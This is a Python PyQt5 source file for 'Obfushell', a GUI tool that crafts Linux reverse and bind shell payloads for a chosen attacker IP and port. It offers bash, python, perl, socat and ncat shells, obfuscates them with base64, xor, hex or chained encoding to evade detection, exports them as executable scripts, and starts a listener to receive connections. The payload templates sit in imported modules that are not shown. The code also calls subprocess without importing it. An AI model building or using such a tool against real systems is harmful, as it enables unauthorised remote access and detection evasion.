import sys
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QComboBox, QCheckBox, QTextEdit, QFileDialog
from core.generator import generate_payload
from core.obfuscator import chain_encode, decode_hint
from core.listener import start_listener
from core.helpers import is_valid_ip, recommend_port

class ObfushellGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Obfushell - Linux Payload Crafter")
        self.setGeometry(200, 200, 500, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        self.payload_label = QLabel("Select Payload Type:", self)
        layout.addWidget(self.payload_label)

        self.payload_combo = QComboBox(self)
        self.payload_combo.addItems(["bash_reverse", "python_reverse", "perl_reverse", "socat_reverse", "socat_bind", "ncat_reverse", "ncat_bind"])
        layout.addWidget(self.payload_combo)

        self.lhost_label = QLabel("Enter LHOST (Attacker IP):", self)
        layout.addWidget(self.lhost_label)

        self.lhost_input = QLineEdit(self)
        layout.addWidget(self.lhost_input)

        self.lport_label = QLabel("Enter LPORT (Attacker Port):", self)
        layout.addWidget(self.lport_label)

        self.lport_input = QLineEdit(self)
        layout.addWidget(self.lport_input)

        self.scan_button = QPushButton("Scan for Best LPORT", self)
        self.scan_button.clicked.connect(self.scan_port)
        layout.addWidget(self.scan_button)

        self.obfuscation_label = QLabel("Select Obfuscation Method:", self)
        layout.addWidget(self.obfuscation_label)

        self.obfuscation_combo = QComboBox(self)
        self.obfuscation_combo.addItems(["base64", "xor", "reverse", "hex", "chain"])
        layout.addWidget(self.obfuscation_combo)

        self.chain_check = QCheckBox("Enable Chaining (random methods)", self)
        layout.addWidget(self.chain_check)

        self.generate_button = QPushButton("Generate Payload", self)
        self.generate_button.clicked.connect(self.generate_payload)
        layout.addWidget(self.generate_button)

        self.result_label = QLabel("Generated Payload:", self)
        layout.addWidget(self.result_label)

        self.result_output = QTextEdit(self)
        self.result_output.setReadOnly(True)
        layout.addWidget(self.result_output)

        self.export_button = QPushButton("Export Payload", self)
        self.export_button.clicked.connect(self.export_payload)
        layout.addWidget(self.export_button)

        self.listen_button = QPushButton("Start Listener", self)
        self.listen_button.clicked.connect(self.start_listener)
        layout.addWidget(self.listen_button)

        self.log_label = QLabel("Activity Log:", self)
        layout.addWidget(self.log_label)

        self.log_output = QTextEdit(self)
        self.log_output.setReadOnly(True)
        layout.addWidget(self.log_output)

        self.setLayout(layout)

    def log(self, message):
        self.log_output.append(f"[*] {message}")

    def scan_port(self):
        lhost = self.lhost_input.text()
        if not is_valid_ip(lhost):
            self.log("Invalid LHOST")
            return
        self.log("Scanning for best port...")
        lport = recommend_port(lhost)
        if lport:
            self.lport_input.setText(str(lport))
            self.log(f"Recommended LPORT: {lport}")
        else:
            self.log("No open ports found")

    def generate_payload(self):
        payload_type = self.payload_combo.currentText()
        lhost = self.lhost_input.text()
        lport = self.lport_input.text()

        if not is_valid_ip(lhost):
            self.log("Invalid LHOST")
            return
        if not lport.isdigit() or not 1 <= int(lport) <= 65535:
            self.log("Invalid LPORT")
            return

        try:
            payload = generate_payload(payload_type, lhost, int(lport))
            self.log(f"Raw Payload:\n{payload}")
        except ValueError as e:
            self.log(str(e))
            return

        obfuscation_method = self.obfuscation_combo.currentText()
        methods = ["base64", "xor", "reverse", "hex"] if self.chain_check.isChecked() else [obfuscation_method]

        try:
            obfuscated_payload, applied_methods, keys = chain_encode(payload, methods)
            hint = decode_hint(applied_methods, keys)
            self.result_output.setText(obfuscated_payload)
            self.log(f"Obfuscated Payload:\n{obfuscated_payload}")
            self.log(hint)
        except ValueError as e:
            self.log(str(e))

    def export_payload(self):
        payload = self.result_output.toPlainText()
        payload_type = self.payload_combo.currentText()
        filename, _ = QFileDialog.getSaveFileName(self, "Save Payload", "", "Shell Script (*.sh);;Python Script (*.py);;All Files (*)")
        if filename:
            try:
                if payload_type.startswith("bash"):
                    with open(filename, "w") as f:
                        f.write("#!/bin/bash\n")
                        f.write(payload)
                elif payload_type.startswith("python"):
                    with open(filename, "w") as f:
                        f.write("#!/usr/bin/env python3\n")
                        f.write(payload.replace("python3 -c '", "").rstrip("'"))
                else:
                    with open(filename, "w") as f:
                        f.write(payload)
                subprocess.call(["chmod", "+x", filename])
                self.log(f"Payload exported to {filename}")
            except Exception as e:
                self.log(f"Error exporting payload: {str(e)}")

    def start_listener(self):
        lport = self.lport_input.text()
        if not lport.isdigit() or not 1 <= int(lport) <= 65535:
            self.log("Invalid LPORT")
            return
        listener_tool = "threaded"  # Default ke threaded
        self.log(f"Starting listener on port {lport}...")
        start_listener(listener_tool, int(lport))

if __name__ == "__main__":
    app = QApplication(sys.argv)
    ex = ObfushellGUI()
    ex.show()
    sys.exit(app.exec_())
